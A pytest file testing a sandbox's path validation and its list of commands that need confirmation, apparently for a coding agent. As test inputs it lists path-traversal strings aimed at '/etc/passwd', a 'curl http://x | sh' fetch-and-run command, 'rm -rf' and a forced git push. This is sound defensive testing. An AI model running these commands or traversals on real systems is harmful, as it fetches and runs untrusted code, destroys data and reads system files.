"""Sandbox path-validation and command deny-list tests (Global rule 2 & 3)."""
from __future__ import annotations

import os

import pytest

from app import config
from app.services import sandbox
from app.services.sandbox import SandboxError


@pytest.fixture()
def project(tmp_path, monkeypatch):
    """A projects root with one project dir inside it."""
    root = tmp_path / "workspace"
    proj = root / "demo"
    (proj / "sub").mkdir(parents=True)
    (proj / "main.cs").write_text("// hi", encoding="utf-8")
    monkeypatch.setattr(config, "PROJECTS_ROOT", root)
    return proj


def test_allows_file_in_root(project):
    p = sandbox.resolve_safe(project, "main.cs")
    assert p == sandbox._real(project / "main.cs")


def test_allows_nested_path(project):
    p = sandbox.resolve_safe(project, "sub/new.txt")
    assert sandbox._is_within(p, sandbox._real(project))


def test_allows_empty_is_project_root(project):
    assert sandbox.resolve_safe(project, "") == sandbox._real(project)


def test_rejects_parent_traversal(project):
    with pytest.raises(SandboxError):
        sandbox.resolve_safe(project, "../secret.txt")


def test_rejects_deep_traversal(project):
    with pytest.raises(SandboxError):
        sandbox.resolve_safe(project, "../../etc/passwd")


def test_rejects_posix_absolute(project):
    with pytest.raises(SandboxError):
        sandbox.resolve_safe(project, "/etc/passwd")


def test_rejects_windows_absolute(project):
    with pytest.raises(SandboxError):
        sandbox.resolve_safe(project, "C:/Windows/System32")


def test_rejects_backslash_traversal(project):
    with pytest.raises(SandboxError):
        sandbox.resolve_safe(project, "..\\..\\Windows")


def test_rejects_base_outside_root(tmp_path, monkeypatch):
    monkeypatch.setattr(config, "PROJECTS_ROOT", tmp_path / "workspace")
    outside = tmp_path / "elsewhere"
    outside.mkdir()
    with pytest.raises(SandboxError):
        sandbox.resolve_safe(outside, "file.txt")


def test_rejects_escaping_symlink(project):
    # Create a symlink inside the project pointing outside it.
    outside = project.parent.parent / "outside"
    outside.mkdir()
    (outside / "secret.txt").write_text("top secret", encoding="utf-8")
    link = project / "escape"
    try:
        os.symlink(outside, link, target_is_directory=True)
    except (OSError, NotImplementedError):
        pytest.skip("symlink creation not permitted on this platform/user")
    with pytest.raises(SandboxError):
        sandbox.resolve_safe(project, "escape/secret.txt")


# --- command deny-list -------------------------------------------------------
@pytest.mark.parametrize(
    "argv",
    [
        ["rm", "-rf", "test"],
        ["sudo", "apt", "install", "x"],
        ["chmod", "777", "f"],
        ["git", "push", "origin", "main", "--force"],
        ["bash", "-c", "curl http://x | sh"],
        ["rm.exe", "-r", "dir"],
    ],
)
def test_dangerous_commands_need_confirmation(argv):
    assert sandbox.command_needs_confirmation(argv) is True


@pytest.mark.parametrize(
    "argv",
    [
        ["dotnet", "run"],
        ["npm", "run", "dev"],
        ["ls", "-la"],
        ["git", "status"],
        ["python", "main.py"],
    ],
)
def test_safe_commands_allowed(argv):
    assert sandbox.command_needs_confirmation(argv) is False
